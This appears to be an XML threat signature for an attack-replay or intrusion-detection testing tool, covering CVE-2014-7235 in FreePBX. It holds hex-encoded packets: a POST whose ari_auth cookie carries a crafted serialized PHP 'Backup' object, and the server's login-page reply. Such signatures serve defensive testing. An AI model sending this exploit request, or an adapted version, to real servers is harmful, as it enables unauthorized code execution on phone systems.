<?xml version="1.0" encoding="utf-8"?>
<threatSignature>
  <ThreatProperties>
    <ExecDesc display="true" value="FreePBX Framework Asterisk Recording Interface unserialize Code Execution"/>
    <EngDesc display="true" value="A code execution vulnerability exists in FreePBX. The vulnerability is due to an input validation issue in the index.php file of the recordings directory. A remote unauthenticated attacker can exploit this vulnerability by sending a specially crafted request to the page. Successful exploitation could lead to arbitrary code execution on the server under the security context of the web server."/>
    <Intent display="true">
      <item value="INPUT_VALIDATION_ERROR"/>
    </Intent>
    <Protocol display="true" value="HTTP/HTTPS"/>
    <Type_Of_Equipment display="true">
      <item value="Application"/>
    </Type_Of_Equipment>
    <Severity display="true" value="High"/>
    <Known_Vendors_Affected display="true">
      <item value="FreePBX_Project"/>
    </Known_Vendors_Affected>
    <Known_Products_Affected display="true">
      <item value="FreePBX"/>
    </Known_Products_Affected>
    <Known_Versions_Affected display="true">
      <item value="2.10/2.11/12"/>
    </Known_Versions_Affected>
    <Credit display="true" value="TSL20141003-06"/>
    <CVEID display="true" value="CVE-2014-7235"/>
    <bugtraqID display="true" value=""/>
    <OSVDB display="true" value="112437"/>
    <Author display="true" value=""/>
    <ID display="true" value="bc9cfe2b0d3f95e0744af0d78618958b"/>
    <Revision display="true" value="1"/>
    <Safe display="true" value=""/>
    <ServerSideAttack display="true" value=""/>
    <SoftwareRevision display="true" value=""/>
    <Suite display="true" value=""/>
    <RunOnce display="false" value=""/>
    <Valid_Traffic display="false" value=""/>
    <AccessVector display="false" value="NETWORK"/>
    <AccessComplexity display="false" value="low"/>
    <Authentication display="false" value="not-required"/>
    <ConfImpact display="false" value="partial"/>
    <IntegImpact display="false" value="partial"/>
    <AvailImpact display="false" value="partial"/>
    <ImpactBias display="false" value=""/>
    <FirstAdded display="false" value=""/>
    <LastModified display="false" value="635551866939184719"/>
    <SigStyle display="false" value=""/>
    <targetNode display="false" value=""/>
    <SigProtocol display="false" value=""/>
    <Rate display="false" value=""/>
    <Regex display="false" value=""/>
    <Created value="1419589822" display="true"/>
  </ThreatProperties>
  <Variables>
    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="G"/>
    <NamedVar name="HTTPdestPort" type="ImperfectControls.Port" value="null" index="H"/>
  </Variables>
  <Loops>
    <for index="A">
      <for index="G"/>
      <for index="H"/>
    </for>
    <for index="B">
      <for index="G"/>
      <for index="H"/>
    </for>
  </Loops>
  <PostScript/>
  <Output index="A" Count="">
    <Ethernet srcMac="00:50:56:B4:62:0E" destMac="00:50:56:B4:3B:A3" pktType="0800">
      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="03F2" Identification="DE0D" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="EF75" srcIP="172.16.8.152" destIP="$destIP" options="" CE="false" DF="true" MF="false">
        <TCP srcPort="58033" destPort="$HTTPdestPort" SeqNumber="C347E64C" AckNumber="4BCA71A3" HeaderLength="08" WindowSize="00E5" Checksum="CC6C" UrgentPointer="0000" Options="0101080A132B38410DFABFF6" Payload="504F5354202F7265636F7264696E67732F696E6465782E70687020485454502F312E310D0A486F73743A203137322E31362E382E3135320D0A436F6E74656E742D4C656E6774683A3136200D0A436F6F6B69653A205048505345535349443D736F6D65737369643B206172695F617574683D612533413125334125374269253341302533424F253341362533412532324261636B7570253232253341372533412537427325334134253341253232617070732532322533424E253342732533413125334125323262253232253342612533413825334125374273253341362533412532325F6374696D65253232253342692533413134313737323639373025334273253341382533412532325F6469726E616D65253232253342732533413025334125323225323225334273253341352533412532325F66696C6525323225334273253341333525334125323232303134313230342D3136303235302D313431373732363937302D3130363736303839253232253342732533413131253341253232706F737462755F686F6F6B2532322533427325334130253341253232253232253342732533413131253341253232706F737472655F686F6F6B253232253342732533413025334125323225323225334273253341313025334125323270726562755F686F6F6B253232253342732533413025334125323225323225334273253341313025334125323270726572655F686F6F6B253232253342732533413025334125323225323225334273253341382533412532325F746D7066696C65253232253342732533413132253341253232253246746D7025324674736C2E7478742532322533422537447325334131253341253232732532322533424E2533427325334131253341253232742532322533424E2533427325334138253341253232616D705F636F6E66253232253342612533413625334125374273253341392533412532324344524442545950452532322533424E25334273253341392533412532324344524442484F53542532322533424E25334273253341392533412532324344524442555345522532322533424E25334273253341392533412532324344524442504153532532322533424E25334273253341392533412532324344524442504F52542532322533424E253342732533413925334125323243445244424E414D452532322533424E253342253744732533413225334125323264622532322533424E253342732533413525334125323263647264622532322533424E2533422537442537440D0A0D0A62746E5375626D69743D5375626D69740D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
      </IP>
    </Ethernet>
  </Output>
  <Input>
    <Ethernet/>
  </Input>
  <ServerSide display="1">
    <Output index="B" Count="">
      <Ethernet srcMac="00:50:56:B4:3B:A3" destMac="00:50:56:B4:62:0E" pktType="0800">
        <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="05DC" Identification="CE59" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="FD3F" srcIP="$destIP" destIP="172.16.8.152" options="" CE="false" DF="true" MF="false">
          <TCP srcPort="$HTTPdestPort" destPort="58033" SeqNumber="4BCA71A3" AckNumber="C347EA0A" HeaderLength="08" WindowSize="0081" Checksum="9F9E" UrgentPointer="0000" Options="0101080A0DFAC16B132B3841" Payload="485454502F312E3120323030204F4B0D0A446174653A205468752C2030342044656320323031342032313A30363A353220474D540D0A5365727665723A204170616368652F322E322E3135202843656E744F53290D0A582D506F77657265642D42793A205048502F352E332E330D0A5365742D436F6F6B69653A204152493D706D386F756D39643631396E6363656C686564673234696173313B20706174683D2F0D0A457870697265733A205468752C203139204E6F7620313938312030383A35323A303020474D540D0A43616368652D436F6E74726F6C3A206E6F2D73746F72652C206E6F2D63616368652C206D7573742D726576616C69646174652C20706F73742D636865636B3D302C207072652D636865636B3D300D0A507261676D613A206E6F2D63616368650D0A436F6E74656E742D4C656E6774683A20363536360D0A436F6E6E656374696F6E3A20636C6F73650D0A436F6E74656E742D547970653A20746578742F68746D6C3B20636861727365743D7574662D380D0A0D0A3C21444F43545950452068746D6C205055424C494320222D2F2F5733432F2F445444205848544D4C20312E30205472616E736974696F6E616C2F2F454E222022687474703A2F2F7777772E77332E6F72672F54522F7868746D6C312F4454442F7868746D6C312D7472616E736974696F6E616C2E647464223E0A3C68746D6C20786D6C6E733D22687474703A2F2F7777772E77332E6F72672F313939392F7868746D6C223E0A20203C686561643E0A202020203C5449544C453E5573657220506F7274616C3C2F5449544C453E0A202020093C6D65746120687474702D65717569763D22436F6E74656E742D547970652220636F6E74656E743D22746578742F68746D6C3B636861727365743D7574662D38223E0A093C6D65746120687474702D65717569763D22582D55412D436F6D70617469626C652220636F6E74656E743D226368726F6D653D31223E0A093C6D657461206E616D653D22726F626F74732220636F6E74656E743D226E6F696E64657822202F3E0A093C6C696E6B2072656C3D2273686F72746375742069636F6E2220687265663D22696D616765732F66617669636F6E2E69636F223E0A202020203C6C696E6B2072656C3D227374796C6573686565742220687265663D227468656D652F6D61696E2E6373732220747970653D22746578742F63737322202F3E090A093C6C696E6B20687265663D222F61646D696E2F6173736574732F6373732F6D7374796C655F6175746F67656E5F313431373439323231372E6373733F6C6F61645F76657273696F6E3D222072656C3D227374796C6573686565742220747970653D22746578742F637373223E3C73637269707420747970653D22746578742F6A61766173637269707422207372633D222F61646D696E2F6173736574732F6A732F6A71756572792D312E372E312E6D696E2E6A73223E3C2F7363726970743E20203C2F686561643E0A20203C626F64793E0A20203C6469762069643D2270616765223E0A20203C64697620636C6173733D226D696E7769647468223E0A20203C64697620636C6173733D22636F6E7461696E6572223E0A202020200A093C6272202F3E0A202020203C6469762069643D22686561646572737061636572223E3C696D67207372633D227468656D652F7370616365722E6769662220616C743D22223E3C2F6469763E0A202020203C6469762069643D226D61696E223E0A202020203C64697620636C6173733D226D696E7769647468223E0A202020203C64697620636C6173733D22636F6E7461696E6572223E0A2020202020203C64697620636C6173733D22737061636572223E3C2F6469763E0A2020202020203C7370616E20636C6173733D226C656674223E0A20202020202020203C6469762069643D226D656E75223E0A202020202020202020203C6469763E3C696D67206865696768743D34207372633D227468656D652F7370616365722E6769662220616C743D22223E3C2F6469763E200A202020202020202020203C64697620636C6173733D226E6176223E0A202020202020202020202020202020202020202020203C2F6469763E0A202020202020202020203C6469763E3C696D67206865696768743D3134207372633D227468656D652F7370616365722E6769662220616C743D22223E3C2F6469763E200A2020202020202020202020202020202020203C2F6469763E0A2020202020203C2F7370616E3E0A2020202020203C7370616E20636C6173733D227269676874223E0A20202020202020203C6469762069643D2263656E746572223E0A20202020202020202020202020202020202020203C6469762069643D22636F6E74656E74223E0A2020202020202020202020203C212D2D20626567696E206D61696E20636F6E74656E74202D2D3E0A20202020202020202020202020203C68323E4C6F67696E3C2F68323E0A2020202020202020202020203C62723E0A2020202020203C6469762069643D276C696E65273E0A20202020202020203C64697620636C6173733D27737061636572273E3C2F6469763E0A20202020202020203C64697620636C6173733D27737061636572273E3C2F6469763E0A2020202020203C2F6469763E0A2020202020203C62723E0A2020202020203C7461626C652069643D276C6F67696E273E0A20202020202020203C666F726D2069643D276C6F67696E27206E616D653D276C6F67696E2720616374696F6E3D696E6465782E706870206D6574686F643D27504F5354273E0A202020202020202020203C74723E0A2020202020202020202020203C746420636C6173733D277269676874273E0A20202020202020202020202020203C736D616C6C3E3C736D616C6C3E4C6F67696E3A266E6273703B266E6273703B3C2F736D616C6C3E3C2F736D616C6C3E0A2020202020202020202020203C2F74643E0A2020202020202020202020203C74643E0A20202020202020202020202020203C696E70757420747970653D277465787427206E616D653D27757365726E616D65272076616C75653D2727206D61786C656E6774683D323020746162696E6465783D313E0A2020202020202020202020203C2F74643E0A202020202020202020203C2F74723E0A202020202020202020203C74723E0A2020202020202020202020203C746420636C6173733D277269676874273E0A20202020202020202020202020203C736D616C6C3E3C736D616C6C3E50617373776F72643A266E6273703B266E6273703B3C2F736D616C6C3E3C2F736D616C6C3E0A2020202020202020202020203C2F74643E0A2020202020202020202020203C746420636F6C7370616E3D313E0A20202020202020202020202020203C696E70757420747970653D2770617373776F726427206E616D653D2770617373776F726427206D61786C656E6774683D323020746162696E6465783D323E0A2020202020202020202020203C2F74643E0A202020202020202020203C2F74723E090A202020202020202020203C74723E090909090A2020202020202020202020203C74643E3C2F74643E090A2020202020202020202020203C74643E0A20202020202020202020202020203C696E70757420747970653D277375626D697427206E616D653D2762746E5375626D6974272076616C75653D275375626D69742720746162696E6465783D333E3C2F736D616C6C3E3C2F736D616C6C3E3C2F703E0A2020202020202020202020203C2F74643E0A202020202020202020203C2F74723E0A202020202020202020203C74723E0A2020202020202020202020203C746420636C6173733D277269676874273E0A20202020202020202020202020203C696E70757420747970653D27636865636B626F7827206E616D653D2772656D656D626572273E0A2020202020202020202020203C2F74643E0A2020202020202020202020203C746420636C6173733D276C656674273E0A20202020202020202020202020203C7020636C6173733D27736D616C6C273E52656D656D6265722050617373776F72643C2F703E0A2020202020202020202020203C2F74643E0A202020202020202020203C2F74723E0A20202020202020203C2F666F726D3E0A20202020202020203C74723E090909090A202020202020202020203C74643E3C2F74643E090A202020202020202020203C74643E0A2020202020202020202020200A20202020202020203C7363726970743E0A2020202020202020202066756E6374696F6E20736574436F6F6B6965286E616D652C76616C756529207B0A2020202020202020202020207661722074203D206E6577204461746528293B0A2020202020202020202020207661722065203D206E6577204461746528293B0A202020202020202020202020652E73657454696D6528742E67657454696D652829202B203336352A32342A36302A3630293B0A202020202020202020202020646F63756D656E742E636F6F6B6965203D206E616D652B223D222B6573636170652876616C756529202B20223B657870697265733D222B652E746F474D54537472696E6728293B0A202020202020202020207D0A20202020202020203C2F7363726970743E0A20202020202020203C666F726D20636C6173733D276C616E6727206E616D653D276C616E672720616374696F6E3D696E6465782E706870206D6574686F643D27504F5354273E0A202020202020202020203C73656C65637420636C6173733D276C616E675F636F646527206E616D653D276C616E675F636F64652720206F6E4368616E67653D22736574436F6F6B696528276172695F6C616E67272C646F63756D656E742E6C616E672E6C616E675F636F64652E76616C7565293B2077696E646F772E6C6F636174696F6E2E72656C6F616428293B223E0A2020202020202020202020203C6F7074696F6E2076616C75653D27656E5F555327203E456E676C6973683C2F6F7074696F6E3E0A2020202020202020202020203C6F7074696F6E2076616C75653D2762675F424727203E42756C67617269616E3C2F6F7074696F6E3E0A2020202020202020202020203C6F7074696F6E2076616C75653D2764615F444B27203E44616E6973683C2F6F7074696F6E3E0A2020202020202020202020203C6F7074696F6E2076616C75653D276E6C5F4E4C27203E44757463683C2F6F7074696F6E3E0A2020202020202020202020203C6F7074696F6E2076616C75653D2765735F455327203E45737061266E74696C64653B6F6C3C2F6F7074696F6E3E0A2020202020202020202020203C6F7074696F6E2076616C75653D2766725F465227203E4672656E63683C2F6F7074696F6E3E0A2020202020202020202020203C6F7074696F6E2076616C75653D2764655F444527203E4765726D616E3C2F6F7074696F6E3E0A2020202020202020202020203C6F7074696F6E2076616C75653D27656C5F475227203E477265656B3C2F6F7074696F6E3E0A2020202020202020202020203C6F7074696F6E2076616C75653D2768655F494C27203E4865627265773C2F6F7074696F6E3E0A2020202020202020202020203C6F7074696F6E2076616C75653D2768755F485527203E48756E67617269616E3C2F6F7074696F6E3E0A2020202020202020202020203C6F7074696F6E2076616C75653D2769745F495427203E4974616C69616E3C2F6F7074696F6E3E0A2020202020202020202020203C6F7074696F6E2076616C75653D2770745F425227203E506F72747567756573653C2F6F7074696F6E3E0A2020202020202020202020203C6F7074696F6E2076616C75653D2772755F525527203E527573736B693C2F6F7074696F6E3E0A2020202020202020202020203C6F7074696F6E2076616C75653D2773765F534527203E537765646973683C2F6F7074696F6E3E0A2020202020202020202020203C6F7074696F6E2076616C75653D277A685F545727203E547261646974696F6E616C204368696E6573653C2F6F7074696F6E3E0A2020202020202020202020203C6F7074696F6E2076616C75653D27756B5F554127203E556B7261696E69616E3C2F6F7074696F6E3E0A202020202020202020203C2F73656C6563743E0A20202020202020203C2F666F726D3E0A202020202020202020203C2F74643E0A20202020202020203C2F74723E0A20202020202020203C74723E3C74643E266E6273703B3C2F74643E3C2F74723E0A2020202020203C2F7461626C653E0A2020202020203C7461626C652069643D276C6F67696E5F74657874273E0A20202020202020203C74723E0A202020202020202020203C74643E55736520796F7572203C623E566F6963656D61696C204D61696C626F7820616E642050617373776F72643C2F623E3C62723E54686973206973207468652073616D652070617373776F7264207573656420666F72207468652070686F6E653C62723E3C62723E466F722070617373776F7264206D61696E74656E616E6365206F7220617373697374616E63652C20636F6E7461637420796F75722050686F6E652053797374656D2041646D696E6973747261746F722E3C62723E0A202020202020202020203C2F74643E0A20202020202020203C2F74723E0A2020202020203C2F7461626C653E0A2020202020203C73637269707420747970653D27746578742F6A617661736372697074273E200A2020202020203C212D2D200A202020202020202069662028646F63756D656E742E6C6F67696E29207B200A20202020202020202020646F63756D656E742E6C6F67696E2E757365726E616D652E666F63757328293B200A20202020202020207D200A2020202020202F2F202D2D3E200A2020202020203C2F7363726970743E2020202020202020202020203C212D2D20656E64206D61696E20636F6E74656E74202D2D3E0A202020202020202020203C2F6469763E0A20202020202020203C2F6469763E0A2020202020203C2F7370616E3E0A2020202020203C64697620636C6173733D22737061636572223E3C2F6469763E0A202020203C2F6469763E0A202020203C2F6469763E0A202020203C2F6469763E0A20203C2F6469763E0A20203C2F6469763E0A20203C2F6469763E0A090A3C73637269707420747970653D22746578742F6A617661736372697074223E76617220667062783D7B22636F6E66223A7B22746578745F646972223A226C7472222C22756E697175656964223A223466626265336261626636616663653933356638363562336632643261656364222C2264697374223A7B227062785F74797065223A22756E6B6E6F776E222C227062785F76657273696F6E223A22756E6B6E6F776E227D2C22766572223A6E756C6C7D2C226D7367223A7B226672616D65776F726B223A7B2272656C6F61645F756E6964656E7469666965645F6572726F72223A22206572726F72287329206F636375727265642C20796F752073686F756C64207669657720746865206E6F74696669636174696F6E206C6F67206F6E207468652064617368626F617264206F72206D61696E2073637265656E20746F20636865636B20666F72206D6F72652064657461696C732E222C22636C6F7365223A22436C6F7365222C22636F6E74696E75656D7367223A22436F6E74696E7565222C2263616E63656C223A2243616E63656C222C227265747279223A225265747279222C22696E76616C69645F726573706F6E6365223A224572726F723A20446964206E6F7420726563656976652076616C696420726573706F6E73652066726F6D20736572766572222C2276616C696461746553696E676C6544657374696E6174696F6E223A7B227265717569726564223A22506C656173652073656C6563742061205C2244657374696E6174696F6E5C22222C226572726F72223A22437573746F6D20476F746F20636F6E7465787473206D75737420636F6E7461696E2074686520737472696E67205C22637573746F6D2D5C222E202069653A20637573746F6D2D6170702C732C31227D2C227765616B536563726574223A7B226C656E677468223A2254686520736563726574206D757374206265206174206D696E696D756D20736978206368617261637465727320696E206C656E6774682E222C227479706573223A2254686520736563726574206D75737420636F6E7461696E206174206C656173742074776F206E756D6265727320616E642074776F206C6574746572732E227D7D7D7D3C2F7363726970743E3C73637269707420747970653D22746578742F6A61766173637269707422207372633D222F61646D696E2F6173736574732F6A732F6A71756572792D75692D312E382E392E6D696E2E6A73223E3C2F7363726970743E3C73637269707420747970653D22746578742F6A61766173637269707422207372633D222F61646D696E2F6173736574732F6A732F7062786C69622E6A733F6C6F61645F76657273696F6E3D2E31343137343932343033223E3C2F7363726970743E3C73637269707420747970653D22746578742F6A617661736372697074223E766172205F6761713D5F6761717C7C5B5D3B5F6761712E70757368285B275F7365744163636F756E74272C2755412D32353732343130392D31275D2C5B275F736574437573746F6D566172272C312C2774797065272C667062782E636F6E662E646973742E7062785F747970652C325D2C5B275F736574437573746F6D566172272C322C2774797065766572272C667062782E636F6E662E646973742E7062785F76657273696F6E2C335D2C5B275F736574437573746F6D566172272C332C27617374766572272C667062782E636F6E662E41535456455253494F4E2C335D2C5B275F736574437573746F6D566172272C342C2766706278766572272C667062782E636F6E662E7665722C335D2C5B275F736574437573746F6D566172272C352C27646973706C6179272C27617269272C335D2C2F2A5B275F736574437573746F6D566172272C312C27756E697175656964272C667062782E636F6E662E756E6971756569642C315D2C5B275F736574437573746F6D566172272C312C276C616E67272C242E636F6F6B696528276C616E6727297C7C27656E5F5553272C335D2C2A2F5B275F747261636B5061676576696577275D293B2866756E6374696F6E28297B7661722067613D646F63756D656E742E637265617465456C656D656E74282773637269707427293B67612E747970653D27746578742F6A617661736372697074273B67612E6173796E633D747275653B67612E7372633D282768747470733A273D3D646F63756D656E742E6C6F636174696F6E2E70726F746F636F6C3F2768747470733A2F2F73736C273A27687474703A2F2F7777772729202B272E676F6F676C652D616E616C79746963732E636F6D2F67612E6A73273B76617220733D646F63756D656E742E676574456C656D656E747342795461674E616D65282773637269707427295B305D3B732E706172656E744E6F64652E696E736572744265666F72652867612C73293B7D2928293B3C2F7363726970743E20203C2F626F64793E0A3C2F68746D6C3E0A0A0A0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="false" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
        </IP>
      </Ethernet>
    </Output>
  </ServerSide>
</threatSignature>
